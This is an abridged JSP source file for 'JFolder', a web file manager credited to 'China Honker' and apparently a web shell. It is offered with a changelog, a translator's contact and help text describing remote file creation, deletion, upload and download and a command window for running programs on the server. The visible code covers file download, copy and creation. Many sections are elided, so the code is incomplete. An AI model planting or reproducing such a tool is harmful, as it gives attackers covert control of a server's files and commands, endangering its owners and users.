<%
/**
JFolder, created by Stephen Cee
Translated into English by Lodzie Kotekya
*/
%>
<%@page errorPage="/"%>
...
String[] authorInfo={" <font color=red> Little Lotte </font>"," <font color=red> China Honker </font>"};
String[] strFileManage   = {"File Management","File Management"};
String[] strCommand      = {"Command Window","Command Window"};
String[] strSysProperty  = {"System Properties","System Properties"};
...
String getDrivers()
/**
Windows - get all logical disks available on the system
*/
{
...
if(strAction!=null && strAction.equals("down"))
{
	...
	if(f.length()==0)
	{
		sbDown.append("The filesize is 0 bytes, it's not downloadable");
	}
	else
	{
...
if(strAction!=null && strAction.equals("savecopy"))
{
	...
	{
		sbSaveCopy.append("<p><font color=red>Object file error.</font>");
	}
	else
	{
		...
		if(f_des.isFile())
		{
			sbSaveCopy.append("<p><font color=red>The destination file already exists and cannot be copied.</font>");
		}
		else
		{
			...
			sbSaveCopy.append("<font color=red>Copied successfully!</font>");			
		}		
	}	
...
<title>JFolder 1.0 - A JSP based web folder management tool by Steven Cee and translated by Lodzie Kotekya</title>
<head>
...
<p>&nbsp;&nbsp;&nbsp; JSP version of the file manager, through which you can remotely manage the file system on the server, you can create, modify,</p>
<p>delete, download files and directories for Windows. The system also provides the function of the command line window, which can run some programs, similar to</p>
<p>Windows Command Prompt.</p>
<p>&nbsp;</p>
<p>2. Credits</p>
<p>&nbsp;&nbsp;&nbsp;<b>Please leave me a message if you have any questions, comments or suggestions during the use process, so as to make this program more perfect and stable.<p>
You can message me at: <a href="https://t.me/lodzie" target="_blank">t.me/lodzie</a></b>
<p>&nbsp;</p>
<p>3. Update Record</p>
<p>&nbsp;&nbsp;&nbsp; 2023.08.26&nbsp; V2.0: Translated to English by Lodzie Kotekya and fixed a lot of the functions.</p>
<p>&nbsp;&nbsp;&nbsp; 2004.11.29&nbsp; V1.0: Beta release, fixes.</p>
<p>&nbsp;&nbsp;&nbsp; 2004.11.15&nbsp; V0.9: The beta version is released, adding some basic functions, such as file editing, copying, deleting, downloading, uploading and new file directory functions.</p>
<p>&nbsp;&nbsp;&nbsp; 2004.10.27&nbsp; V0.6: Temporarily set it as version 0.6, it provides directory file browsing function and cmd function.</p>
<p>&nbsp;&nbsp;&nbsp; 2004.09.20&nbsp; V0.1: This is a small simple program that displays directory files.</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
</div>
...
<table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
	...
	<input type="submit" name="btnNewFile" value="Create A New File" onclick="frmMake.submit()" > 
